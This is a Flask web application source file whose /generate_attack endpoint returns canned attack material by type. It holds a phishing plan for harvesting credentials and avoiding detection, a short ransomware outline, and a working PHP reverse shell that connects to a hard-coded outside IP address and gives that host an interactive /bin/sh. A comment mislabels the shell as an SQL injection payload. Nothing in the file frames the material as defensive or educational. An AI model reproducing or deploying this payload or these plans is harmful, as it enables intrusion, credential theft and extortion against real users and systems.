from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend-backend communication

# Define responses for specific attack types
attack_strategies = {
    "phishing": """Phishing Strategy:
1. Set up a fake website resembling the target's legitimate service.
2. Use email spoofing to send messages that appear to come from trusted sources.
3. Include a malicious link redirecting to the fake site.
4. Collect credentials entered by the target.
5. Avoid detection by using URL shortening services or obfuscated links.""",
    "ransomware": "Ransomware Strategy:\n1. Encrypt critical files on the victim's system.\n2. Demand a ransom for decryption keys.\n3. Use strong encryption algorithms to prevent easy recovery.",
    "rce for hacking": """<?php
// Example: SQL Injection payload (reverse shell) implementation
set_time_limit (0);
$VERSION = "1.0";
$ip = '3.84.151.202';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { print("$errstr ($errno)"); exit(1); }
$descriptorspec = array(
   0 => array("pipe", "r"), 
   1 => array("pipe", "w"), 
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }
while (!feof($sock)) {
    fwrite($pipes[0], fread($sock, $chunk_size));
    fwrite($sock, fread($pipes[1], $chunk_size));
}
fclose($sock);
?>"""
}

@app.route('/generate_attack', methods=['POST'])
def generate_attack():
    try:
        # Parse the incoming JSON request
        data = request.get_json()
        if not data or 'attack_type' not in data:
            return jsonify({"error": "Invalid request. 'attack_type' is required."}), 400

        attack_type = data['attack_type'].lower()

        # Fetch the corresponding strategy or return a default response
        response = attack_strategies.get(
            attack_type, 
            f"No predefined strategy for '{attack_type}'. Please try another attack type."
        )

        return jsonify({"response": response}), 200
    except Exception as e:
        # Log the error for debugging
        print(f"Error: {e}")
        return jsonify({"error": "Failed to generate response"}), 500

if __name__ == '__main__':
    app.run(debug=True)
